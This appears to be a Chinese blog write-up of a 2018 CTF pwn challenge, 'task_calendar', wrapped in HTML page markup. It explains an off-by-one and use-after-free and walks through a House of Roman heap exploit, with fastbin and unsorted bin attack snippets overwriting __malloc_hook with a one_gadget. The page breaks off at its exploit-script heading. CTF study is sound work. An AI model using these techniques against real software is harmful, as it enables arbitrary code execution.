@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="task_calendar基本逻辑程序有三个主要功能，add，edit和remove，有两个全局的数组存放地址和size。 add函数分配新的堆块，size限制在0~0x68之间，并在数组中记录信息。其中get_day()用于输入的星期。 12345678910111213141516171819202122232425262728293031323334353637383940414243444">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018护网杯线上赛pwn">
+<meta property="og:url" content="http://0gur1.cc/2018/10/22/2018护网杯线上赛pwn/index.html">
+<meta property="og:site_name" content="0gur1">
+<meta property="og:description" content="task_calendar基本逻辑程序有三个主要功能，add，edit和remove，有两个全局的数组存放地址和size。 add函数分配新的堆块，size限制在0~0x68之间，并在数组中记录信息。其中get_day()用于输入的星期。 12345678910111213141516171819202122232425262728293031323334353637383940414243444">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-10-22T13:31:26.007Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018护网杯线上赛pwn">
+<meta name="twitter:description" content="task_calendar基本逻辑程序有三个主要功能，add，edit和remove，有两个全局的数组存放地址和size。 add函数分配新的堆块，size限制在0~0x68之间，并在数组中记录信息。其中get_day()用于输入的星期。 12345678910111213141516171819202122232425262728293031323334353637383940414243444">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+	  applicationID: '7MHLMVVD1M',
+      apiKey: 'dbb74cd528079f8c1d1a6138e9ed5b67',
+      indexName: 'test_hexo',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0gur1.cc/2018/10/22/2018护网杯线上赛pwn/"/>
+
+
+
+
+
+  <title>2018护网杯线上赛pwn | 0gur1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0gur1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  <!-- -->
+  
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/10/22/2018护网杯线上赛pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0gur1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0gur1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018护网杯线上赛pwn</h1>
+        
+
+        <div class="post-meta">
+		  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-22T19:50:11+08:00">
+                2018-10-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/10/22/2018护网杯线上赛pwn/" class="leancloud_visitors" data-flag-title="2018护网杯线上赛pwn">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,026字
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="task-calendar"><a href="#task-calendar" class="headerlink" title="task_calendar"></a>task_calendar</h1><h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>程序有三个主要功能，add，edit和remove，有两个全局的数组存放地址和size。</p>
+<p>add函数分配新的堆块，size限制在0~0x68之间，并在数组中记录信息。其中get_day()用于输入的星期。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  LODWORD(v0) = get_day();</span><br><span class="line">  idx = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)v0 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size&gt; "</span>);</span><br><span class="line">    LODWORD(v0) = read_int();</span><br><span class="line">    size = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">0x68</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      addr_list[idx] = <span class="built_in">malloc</span>((<span class="keyword">signed</span> <span class="keyword">int</span>)v0);</span><br><span class="line">      v0 = size_list;</span><br><span class="line">      size_list[idx] = size;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">get_day</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"which day: "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. Monday"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. Tuesday"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"3. Wednesday"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"4. Thursday"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"5. Friday"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"6. Saturday"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"7. Sunday"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"choice&gt; "</span>);</span><br><span class="line">  v1 = read_int() - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">3</span> || v1 &gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">3</span> )</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"These days are rest time."</span>);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>edit函数向分配好的地址内写入内容，其中用到了read_n_off_by_one，这个函数中存在一字节的溢出：规定读入的长度为a2，但在循环时读入了a2+1个字节。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 __idx; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  LODWORD(__idx) = get_day();</span><br><span class="line">  idx = __idx;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)__idx != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __idx = addr_list[(<span class="keyword">signed</span> <span class="keyword">int</span>)__idx];</span><br><span class="line">    <span class="keyword">if</span> ( __idx )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"size&gt; "</span>);</span><br><span class="line">      LODWORD(__idx) = read_int();</span><br><span class="line">      v3 = __idx;                               <span class="comment">// new size</span></span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)__idx &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        __idx = size_list[idx];                 <span class="comment">// origin size</span></span><br><span class="line">        <span class="keyword">if</span> ( v3 &lt;= __idx )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"info&gt; "</span>);</span><br><span class="line">          LODWORD(__idx) = read_n_off_by_one(addr_list[idx], v3);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">read_n_off_by_one</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= a2; ++i ) <span class="comment">//i=0~a2</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>remove释放地址对应的内存，没有对指针置零。而且上面也注意到，add和edit时并不检查数组是否为零等情况，因此可以多次释放、写入。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = get_day();</span><br><span class="line">  <span class="keyword">if</span> ( v0 != <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)addr_list[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><p>edit时能够造成一字节的溢出，可以覆写下一堆块的size字段。并且free后的不置零，存在UAF和double free漏洞。但本题没有输出，不能用常规方法泄露地址。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>要对以上的漏洞进行利用，涉及一个对我来说新的知识点：house of roman。该方法可以参考<a href="https://xz.aliyun.com/t/2316" target="_blank" rel="noopener">hackedbylh</a>的《House of Roman是实战》。</p>
+<p>我对House of Roman的理解是，充分利用main_arena+88这个数据，它是main_arena中unsortedbin头的地址，通过简单的变形能够得到main_arena和malloc_hook的地址。利用方法为：</p>
+<ol>
+<li>释放一个块到unsorted bin，并重新分配，保证FD，BK为main_arena+88。通过溢出修改该unsorted bin的size为0x71。</li>
+<li>利用UAF构成<strong>fastbin attack</strong>，将unsorted bin链入到0x70的fastbin中，并修改unsorted bin的FD为malloc_hook-0x23地址（main_arena-0x10-0x23），此处恰好能凑成一个size字段为0x7f的块，使fastbin中结构为：fb_header-&gt;0x70chunk-&gt;unsorted bin chunk -&gt; malloc_hook-0x23</li>
+<li>利用<strong>unsorted bin attack</strong>的<code>bck-&gt;fd = unsorted_chunks(av)</code>，修改malloc_hook为main_arena+88</li>
+<li>编辑malloc_hook-0x23的块，向malloc_hook写入one_gadget</li>
+</ol>
+<p>本题中存在溢出，能够修改size；存在UAF，能够利用fastbin attack和unsorted bin attack，可以使用house of roman。</p>
+<p>参照上面的步骤：</p>
+<ol>
+<li><p>构造unsorted bin</p>
+<p>不能直接分配unsortedbin大小的块，利用溢出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>) <span class="comment">#0x00</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>) <span class="comment">#0x70</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">24</span>)   <span class="comment">#0xe0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>) <span class="comment">#0x100</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>) <span class="comment">#0x170</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>) <span class="comment">#0x1e0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">24</span>,<span class="string">'0'</span>*<span class="number">24</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure>
+<p>前面多分配的两块0x60是有用的，后面要用到；后面分配的两个0x60一个用来消耗unsorted bin，另一个用于与top隔开。</p>
+</li>
+<li><p>fastbin attack</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">1</span>,<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+<p>在释放两个fastbin后，#3中FD的值为#2的地址，即0xXXXXXXXXX170，在edit时输入\n会被转换为00写入，即FD变成0xXXXXXXXXX100，即指向了#1，而#1的FD为main_aren+88，因此fastbin为：#3-&gt;#1-&gt;main_aren+88。</p>
+<p>PS：因为read_n_off_by_one函数中用的是read函数，所以会等到读入足够的字节数才会返回，而且由于read_n_off_by_one多读入一个字节，当想读入1个字节时，传入的参数只能为0或者直接输入\n，而当参数为0时不能通过内部的检查，因此必须通过输入\n来实现写入一个字节。\n会转为\0，所以要分配第一步中的前两个chunk，使得#1的地址以\x00结尾。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bytes = (get_base(p)+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">1</span>,p32(bytes)[:<span class="number">-2</span>]) <span class="comment">#change main_aren+88 to malloc_hook-0x23</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>) <span class="comment">#point to 3's chunk</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>) <span class="comment">#point to 1's chunk</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>) <span class="comment">#point to malloc_hook-0x23</span></span><br></pre></td></tr></table></figure>
+<p>这一系列操作结束后，addr_list[0]里存放的是malloc_hook-0x23的地址。</p>
+</li>
+<li><p>unsorted bin attack</p>
+<p>构造unsorted bin的方法和第一步相同，为了利用unsorted bin attack，修改BK的值为malloc_hook-0x10，根据以往的经验，malloc_hook都是以0xb10结尾的，malloc_hook-0x10则是以0xb00结尾，因此输入\n使之变为\x00。</p>
+<p>需要注意的是，当unsorted bin的size大于要分配的size并且为last_remainder时，只对unsorted bin进行切分而不会解链操作。而本题中，最开始我没有再修改unsorted bin的size，使之大于要分配的fastbin的大小，但这个unsorted bin并不是last remainder，因此会把它放到对应的smallbin里并检查FD对应的chunk，而由于FD已经被修改了，引起了malloc_printerr。所以要再次修改unsorted bin的size。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">24</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">24</span>,<span class="string">'0'</span>*<span class="number">24</span>+<span class="string">'\xc1'</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">bytes = (get_base(p)+libc.symbols[<span class="string">'__malloc_hook'</span>])&amp;<span class="number">0xffff</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">8</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">24</span>,<span class="string">'0'</span>*<span class="number">24</span>+<span class="string">'\x61'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _int_malloc()函数         </span></span><br><span class="line">       <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              <span class="comment">//只是修改头的fd和bk，没有解链</span></span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              ……</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>写入one_gadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bytes = (get_base(p)+gadget[2])&amp;0xffffff</span><br><span class="line">edit(0,21,19*&apos;a&apos;+p32(bytes)[:-1])</span><br></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+</ol>
+<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 